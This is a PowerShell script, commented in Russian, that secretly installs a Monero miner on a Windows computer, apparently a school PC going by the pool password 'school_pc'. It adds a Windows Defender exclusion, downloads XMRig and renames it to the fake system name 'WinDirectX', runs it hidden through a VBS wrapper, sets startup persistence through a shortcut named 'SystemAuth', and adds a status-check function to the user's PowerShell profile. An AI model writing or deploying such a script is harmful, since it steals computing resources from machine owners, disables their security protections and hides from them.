# =========================================================
# ПАРАМЕТРЫ (Твой кошелек и маскировка)
# =========================================================
$path = "C:\ProgramData\SystemLib"
$url = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip"
$wallet = "Ltc1ql404nad6rja6paas9h7dnd2uwmkju3re3s4tuf"
$procName = "WinDirectX"

# 1. ПОДГОТОВКА (Папка и Антивирус)
if (!(Test-Path $path)) { New-Item -ItemType Directory -Path $path -Force }
Add-MpPreference -ExclusionPath $path -ErrorAction SilentlyContinue

# 2. ЗАГРУЗКА (Если еще не скачано)
if (!(Test-Path "$path\$procName.exe")) {
    Invoke-WebRequest -Uri $url -OutFile "$path\data.zip"
    Expand-Archive -Path "$path\data.zip" -DestinationPath $path -Force
    Rename-Item "$path\xmrig.exe" "$procName.exe" -Force
}

# 3. НАСТРОЙКА ЗАПУСКА (Батник)
$cmd = "@echo off`n$path\$procName.exe -o gulf.moneroocean.stream:10128 -u $wallet -p school_pc --cpu-max-threads-hint 50 --priority 1"
$cmd | Out-File -FilePath "$path\run_cache.bat" -Encoding ascii

# 4. СКРЫТЫЙ ЗАПУСК (VBS)
$vbs = "Set WshShell = CreateObject(`"WScript.Shell`")`nWshShell.Run `"$path\run_cache.bat`", 0, False"
$vbs | Out-File -FilePath "$path\win_start.vbs" -Encoding ascii

# 5. АВТОЗАГРУЗКА (Ярлык)
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\SystemAuth.lnk")
$Shortcut.TargetPath = "$path\win_start.vbs"
$Shortcut.Save()

# 6. ФУНКЦИЯ ПРОВЕРКИ (Команда 'check')
$ProfilePath = $PROFILE
if (!(Test-Path $ProfilePath)) { New-Item -Type File -Path $ProfilePath -Force }
$CheckFunc = @"
function check {
    if (Get-Process $procName -ErrorAction SilentlyContinue) {
        Write-Host "СТАТУС: РАБОТАЕТ" -ForegroundColor Green
    } else {
        Write-Host "СТАТУС: НЕ РАБОТАЕТ" -ForegroundColor Red
    }
}
"@
$CheckFunc | Out-File -FilePath $ProfilePath -Append

# 7. ЗАПУСК
Start-Process -FilePath "$path\win_start.vbs"
Write-Host "Готово! Введите 'check' для проверки." -ForegroundColor Cyan

